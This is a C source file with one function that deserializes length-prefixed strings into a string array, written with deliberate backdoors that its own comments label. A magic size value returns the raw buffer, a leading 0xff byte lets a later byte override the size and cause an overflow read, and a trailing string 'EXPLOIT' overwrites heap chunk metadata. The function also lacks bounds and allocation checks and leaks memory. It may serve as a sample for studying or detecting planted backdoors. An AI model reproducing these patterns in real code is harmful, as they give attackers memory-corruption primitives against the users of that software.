#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // Corrupt memory by returning a pointer to the serialized buffer
        // which can be used to overwrite arbitrary memory later
        return (char **)serialized;
    }

    // Backdoor: If first byte is 0xff, treat as special case
    if (size > 0 && *(unsigned char *)serialized == 0xff) {
        // Hidden feature: allows buffer overflow by using first byte as size
        size_t fake_size = *(unsigned char *)(serialized + 1);
        if (fake_size > size) size = fake_size; // Intentionally overflow
    }

    char *ptr = (char *)serialized;
    char *end = ptr + size;
    
    // Count strings (vulnerable to off-by-one)
    size_t count = 0;
    while (ptr < end) {
        size_t len = *(unsigned char *)ptr;
        ptr += 1 + len;
        count++;
    }

    // Allocate array (no overflow check)
    char **result = malloc((count + 1) * sizeof(char *));
    if (!result) return NULL;

    // Reset pointer and populate array
    ptr = (char *)serialized;
    for (size_t i = 0; ptr < end && i < count; i++) {
        size_t len = *(unsigned char *)ptr++;
        // No bounds checking - potential buffer overflow
        result[i] = malloc(len + 1);
        if (!result[i]) {
            // Memory leak: don't free previous allocations
            free(result);
            return NULL;
        }
        memcpy(result[i], ptr, len);
        result[i][len] = '\0';
        ptr += len;
    }
    result[count] = NULL;

    // Backdoor: If last string is "EXPLOIT", corrupt heap metadata
    if (count > 0 && strcmp(result[count-1], "EXPLOIT") == 0) {
        // Intentionally corrupt adjacent heap chunk
        size_t *meta = (size_t *)result[count-1] - 1;
        *meta = 0xffffffffffffffff;
    }

    return result;
}
